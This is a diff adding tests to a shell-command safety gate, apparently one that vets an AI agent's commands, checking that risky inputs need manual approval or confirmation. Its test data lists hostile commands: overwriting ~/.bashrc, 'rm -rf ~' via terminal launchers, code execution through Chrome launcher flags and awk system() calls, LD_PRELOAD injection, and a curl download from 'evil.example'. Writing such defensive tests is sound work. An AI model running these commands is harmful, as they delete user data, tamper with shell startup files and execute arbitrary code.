@@ -123,9 +123,31 @@ def test_the_programs_commands_yaml_uses_still_run_by_themselves(gate, command):
     "awk -f /tmp/evil.awk x", "awk -i inplace '{print}' ~/.bashrc", "gawk 'BEGIN{\"id\" | getline x}'",
     "xterm -e 'rm -rf ~'", "gnome-terminal --command='rm -rf ~'", "sort --output=/home/x/.bashrc in", "sort -ro out",
     "find / -fprintf /tmp/x '%p'", "find . -fls ~/.bashrc",
+    "echo hi >& ~/.bashrc", "ls >&/tmp/x", "awk -fx data", "awk --file=x data",
+    "google-chrome --gpu-launcher='touch /tmp/pwn'", "google-chrome --renderer-cmd-prefix=/tmp/x",
+    "code --install-extension evil.vsix", "google-chrome -gpu-launcher='touch /tmp/p'",
+    "google-chrome --zygote-cmd-prefix=/tmp/x", "awk -e'BEGIN{system(\"touch /tmp/p\")}'",
+    "awk --source='BEGIN{system(\"x\")}'",
 ])
 def test_more_ways_to_run_or_write_through_a_safe_program(gate, command):
     assert gate.classify(command)[0] == MANUAL
+
+
+@pytest.mark.parametrize("command", [
+    "curl -s -o /dev/null http://127.0.0.1:7314 -o /home/x/.bashrc http://evil.example/x",  # exact entry + extra args
+    "./ls", "/tmp/x/ls -la", "~/jarvis-workspace/cat x", "./git status",  # a file named like a safe program
+    "PATH=. ls", "LD_PRELOAD=/tmp/e.so ls",  # a variable that changes what runs
+])
+def test_lookalikes_of_safe_commands_ask(gate, command):
+    assert gate.classify(command)[0] == CONFIRM
+
+
+@pytest.mark.parametrize("command", [
+    "echo hi >&2", "ls 2>&1 | head", "/usr/bin/ls -la", "git config user.name",
+    "curl -s -o /dev/null http://127.0.0.1:7314 || npm --prefix /home/biztelai/Projects/study-budd run dev",
+])
+def test_safe_forms_still_run_by_themselves(gate, command):
+    assert gate.classify(command)[0] == AUTO
 
 
 def test_chained_commands_with_cd_are_safe_and_not_missing(gate):
